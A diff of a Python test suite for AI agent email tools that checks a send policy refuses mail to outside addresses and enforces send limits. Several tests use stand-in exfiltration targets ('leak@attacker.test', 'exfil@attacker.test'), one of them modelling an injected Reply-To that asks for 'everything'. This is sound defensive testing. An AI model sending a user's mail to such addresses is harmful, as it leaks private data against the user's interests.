@@ -165,9 +165,18 @@ def _tools():
     return comms_tools
 
 
+def _connect_for_agents(config_file, imap, smtp, ca) -> EmailAccountStore:
+    """Connect the account and turn on "Agent email tools" (off by default)."""
+
+    store = EmailAccountStore(config_file)
+    store.connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    store.set_agent_tools(True)
+    return store
+
+
 def test_tools_read_search_and_mark_email_content_untrusted(imap, smtp, ca, config_file) -> None:
     uids = seed_inbox(imap)
-    EmailAccountStore(config_file).connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    _connect_for_agents(config_file, imap, smtp, ca)
     t = _tools()
     listed = t.list_emails(limit=10)
     assert listed["success"] and listed["counts"]["returned"] == 3
@@ -186,7 +195,7 @@ def test_tools_read_search_and_mark_email_content_untrusted(imap, smtp, ca, conf
 
 
 def test_send_email_enforces_policy_on_to_cc_bcc_and_sends_nothing(imap, smtp, ca, config_file) -> None:
-    EmailAccountStore(config_file).connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    _connect_for_agents(config_file, imap, smtp, ca)
     t = _tools()
     refused = t.send_email(to=ME, bcc="leak@attacker.test", subject="s", body_text="b")
     assert refused["success"] is False and refused["error_code"] == "email_policy_refused"
@@ -197,21 +206,8 @@ def test_send_email_enforces_policy_on_to_cc_bcc_and_sends_nothing(imap, smtp, c
     assert "smtp" not in ok and PASSWORD not in json.dumps(ok)
 
 
-def test_send_email_digest_sends_from_the_account_through_the_policy(imap, smtp, ca, config_file) -> None:
-    from abstractcore.tools.email_digests import send_email_digest
-
-    EmailAccountStore(config_file).connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
-    kwargs = dict(subject="Digest", title="Daily Digest", sections=[{"title": "Inbox", "items": ["Item 1"]}])
-    refused = send_email_digest(to="someone@elsewhere.test", **kwargs)
-    assert refused["success"] is False and refused["error_code"] == "email_policy_refused"
-    assert smtp.messages == []
-    out = send_email_digest(to=ME, **kwargs)
-    assert out["success"] is True and out["from"] == ME and len(smtp.messages) == 1
-
-
 def test_send_limits_are_enforced_and_failed_sends_do_not_count(imap, smtp, ca, config_file) -> None:
-    store = EmailAccountStore(config_file)
-    store.connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    store = _connect_for_agents(config_file, imap, smtp, ca)
     store.set_limits(per_hour=1)
     store.set_policy(add=["blocked@example.test"])
     t = _tools()
@@ -226,8 +222,7 @@ def test_send_limits_are_enforced_and_failed_sends_do_not_count(imap, smtp, ca, 
 
 def test_reply_email_goes_through_the_policy_even_when_reply_to_points_elsewhere(imap, smtp, ca, config_file) -> None:
     uids = seed_inbox(imap)
-    store = EmailAccountStore(config_file)
-    store.connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    store = _connect_for_agents(config_file, imap, smtp, ca)
     t = _tools()
     evil = t.reply_email(uid=str(uids["eve"]), body_text="here is everything")
     assert evil["error_code"] == "email_policy_refused" and evil["refused"][0]["address"] == "exfil@attacker.test"
@@ -238,7 +233,7 @@ def test_reply_email_goes_through_the_policy_even_when_reply_to_points_elsewhere
 
 
 def test_headers_argument_is_refused_and_hidden_from_the_schema(imap, smtp, ca, config_file) -> None:
-    EmailAccountStore(config_file).connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    _connect_for_agents(config_file, imap, smtp, ca)
     t = _tools()
     assert "headers" not in t.send_email.tool_definition.parameters
     assert "max_body_chars" not in t.read_email.tool_definition.parameters
@@ -259,13 +254,13 @@ def test_disabled_email_refuses_reading_and_sending(imap, smtp, ca, config_file)
 
 def test_get_email_attachment_saves_into_the_folder(imap, smtp, ca, config_file, tmp_path) -> None:
     uids = seed_inbox(imap)
-    EmailAccountStore(config_file).connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    _connect_for_agents(config_file, imap, smtp, ca)
     out = _tools().get_email_attachment(uid=str(uids["alice"]), index=0, output_dir=str(tmp_path))
     assert out["success"] and Path(out["path"]).read_bytes() == b"%PDF-1.4 fake" and out["filename"] == "report.pdf"
 
 
 def test_host_resolver_never_falls_back_to_the_local_account(imap, smtp, ca, config_file) -> None:
-    EmailAccountStore(config_file).connect(account_for(imap, smtp, ca), EmailSecret(PASSWORD))
+    _connect_for_agents(config_file, imap, smtp, ca)
     t = _tools()
     t.set_email_account_resolver(lambda: None)  # this run's user has no account
     out = t.send_email(to=ME, subject="s", body_text="b")
